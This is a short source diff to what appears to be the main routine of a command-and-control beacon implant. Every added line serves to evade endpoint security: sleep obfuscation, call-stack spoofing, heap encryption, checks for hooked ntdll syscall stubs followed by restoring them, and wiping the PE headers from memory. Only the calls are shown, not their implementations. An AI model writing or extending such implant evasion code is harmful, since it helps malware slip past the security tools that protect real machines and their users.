@@ -6,6 +6,10 @@
 #include "WaitMask.h"
 #include "Boffer.h"
 #include "Connector.h"
+#include "SleepObf.h"
+#include "CallSpoof.h"
+#include "HeapCrypt.h"
+#include "NtdllRefresh.h"
 
 #if defined(BEACON_HTTP)
 #include "ConnectorHTTP.h"
@@ -37,6 +41,17 @@ DWORD WINAPI AgentMain(LPVOID lpParam)
 {
 	if (!ApiLoad())
 		return 0;
+
+	SaveImageInfo();
+	CallSpoofInit();
+	HeapCryptInit();
+
+	if (IsNtStubHooked((PVOID)ApiNt->NtOpenProcessToken))
+		RefreshNtdllStub((PVOID)ApiNt->NtOpenProcessToken);
+	if (IsNtStubHooked((PVOID)ApiNt->NtQueryInformationProcess))
+		RefreshNtdllStub((PVOID)ApiNt->NtQueryInformationProcess);
+
+	StompPEHeaders();
 
 	g_Agent = new Agent();
 	g_Connector = CreateConnector();
